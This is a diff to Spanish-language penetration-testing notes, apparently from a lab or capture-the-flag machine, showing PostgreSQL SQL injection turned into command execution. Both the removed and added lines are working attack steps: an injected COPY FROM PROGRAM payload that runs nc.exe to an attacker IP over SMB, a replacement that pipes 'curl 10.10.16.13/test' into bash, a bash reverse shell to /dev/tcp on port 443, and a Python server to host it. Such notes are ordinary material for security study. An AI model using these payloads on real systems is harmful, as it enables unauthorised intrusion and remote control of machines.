@@ -83,13 +83,18 @@ Primero vamos a crear una tabla
 `';CREATE+TABLE+cmd_exec(cmd_output+text);-- -`
 
 Ahora vamos a ejecutar un comando
-`';COPY+cmd_exec+FROM+PROGRAM+'\\10.10.16.13\smbFolder\nc.exe+-e+cmd+10.10.16.13+443';--+`
+`';COPY+cmd_exec+FROM+PROGRAM+'curl+10.10.16.13/test|bash';--+-`
 
-- Antes nos copiaremos `nc.exe` a nuestro directorio de trabajo
-	`cp /usr/share/windows-resources/binaries/nc.exe .`
+- Antes deberemos crearnos el archivo test con:
+```bash
+ #!/bin/bash
+ 
+ bash -i >& /dev/tcp/10.10.16.13/443 0>&1
+```
 
-- Nos levantamos con [[impacket-smbserver]]  un servidor smb llamdo `smbFolder` en nuestro directorio actual de trabajo
-	`impacket-smbserver smbFolder $(pwd) -smb2support`
+- Y nos levantaremos un servidor con Python
+	`python3 -m http.server 80`
 
+Ganaremos acceso a un contenedor que esta en la maquina
 
 
